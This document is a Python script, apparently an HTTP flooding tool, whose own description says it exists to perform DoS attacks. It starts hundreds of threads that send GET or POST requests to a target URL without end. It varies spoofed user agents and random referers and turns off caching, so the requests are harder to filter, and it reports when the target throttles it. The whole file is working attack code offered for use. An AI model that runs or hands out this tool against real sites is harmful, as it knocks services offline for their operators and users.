 
 
import requests
import sys
import threading
import random
import re
import argparse
 
host=&#039;&#039;
headers_useragents=[]
request_counter=0
printedMsgs = []
 
def printMsg(msg):
    if msg not in printedMsgs:
        print "\n"+msg + " after %i requests" % request_counter
    printedMsgs.append(msg)
 
def useragent_list():
    global headers_useragents
    headers_useragents.append(&#039;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3&#039;)
    headers_useragents.append(&#039;Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)&#039;)
    headers_useragents.append(&#039;Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)&#039;)
    headers_useragents.append(&#039;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1&#039;)
    headers_useragents.append(&#039;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1&#039;)
    headers_useragents.append(&#039;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)&#039;)
    headers_useragents.append(&#039;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)&#039;)
    headers_useragents.append(&#039;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)&#039;)
    headers_useragents.append(&#039;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)&#039;)
    headers_useragents.append(&#039;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)&#039;)
    headers_useragents.append(&#039;Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)&#039;)
    headers_useragents.append(&#039;Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51&#039;)
    return(headers_useragents)
     
def randomString(size):
    out_str = &#039;&#039;
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)
 
def initHeaders():
    useragent_list()
    global headers_useragents, additionalHeaders
    headers = {
                &#039;User-Agent&#039;: random.choice(headers_useragents),
                &#039;Cache-Control&#039;: &#039;no-cache&#039;,
                &#039;Accept-Charset&#039;: &#039;ISO-8859-1,utf-8;q=0.7,*;q=0.7&#039;,
                &#039;Referer&#039;: "http://www.google.com/?q=" + randomString(random.randint(5,10)),
                &#039;Keep-Alive&#039;: random.randint(110,120),
                &#039;Connection&#039;: &#039;keep-alive&#039;
                }
 
    if additionalHeaders:
        for header in additionalHeaders:
            headers.update({header.split(":")[0]:header.split(":")[1]})
    return headers
 
def handleStatusCodes(status_code):
    global request_counter
    sys.stdout.write("\rNumber of requests sent %i" % request_counter)
    sys.stdout.flush()
    if status_code == 429:
            printMsg("You have been throttled")
    if status_code == 500:
        printedMsg("Status code 500 received")
 
def sendGET(url):
    global request_counter
    headers = initHeaders()
    try:
        request_counter+=1
        request = requests.get(url, headers=headers)
        handleStatusCodes(request.status_code)
 
    except e:
        pass
 
def sendPOST(url, payload):
    global request_counter
    headers = initHeaders()
    try:
        request_counter+=1
        if payload:
            request = requests.post(url, data=payload, headers=headers)
        else:
            request = requests.post(url, headers=headers)
        handleStatusCodes(request.status_code)
         
    except e:
        pass
 
class SendGETThread(threading.Thread):
    def run(self):
        try:
            while True:
                global url
                sendGET(url)
        except:
            pass
 
class SendPOSTThread(threading.Thread):
    def run(self):
        try:
            while True:
                global url, payload
                sendPOST(url, payload)
        except:
            pass
 
 
# TODO:
# check if the site stop responding and alert
 
def main(argv):
    parser = argparse.ArgumentParser(description=&#039;Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily&#039;)
    parser.add_argument(&#039;-g&#039;, help=&#039;Specify GET request. Usage: -g \&#039;<url>\&#039;&#039;)
    parser.add_argument(&#039;-p&#039;, help=&#039;Specify POST request. Usage: -p \&#039;<url>\&#039;&#039;)
    parser.add_argument(&#039;-d&#039;, help=&#039;Specify data payload for POST request&#039;, default=None)
    parser.add_argument(&#039;-ah&#039;, help=&#039;Specify addtional header/s. Usage: -ah \&#039;Content-type: application/json\&#039; \&#039;User-Agent: Doser\&#039;&#039;, default=None, nargs=&#039;*&#039;)
    parser.add_argument(&#039;-t&#039;, help=&#039;Specify number of threads to be used&#039;, default=500, type=int)
    args = parser.parse_args()
 
    global url, payload, additionalHeaders
    additionalHeaders = args.ah
    payload = args.d
 
    if args.g:
        url = args.g
        for i in range(args.t):
            t = SendGETThread()
            t.start()
 
    if args.p:
        url = args.p
        for i in range(args.t):
            t = SendPOSTThread()
            t.start()
     
    if len(sys.argv)==1:
        parser.print_help()
        exit()
     
if __name__ == "__main__":
   main(sys.argv[1:])

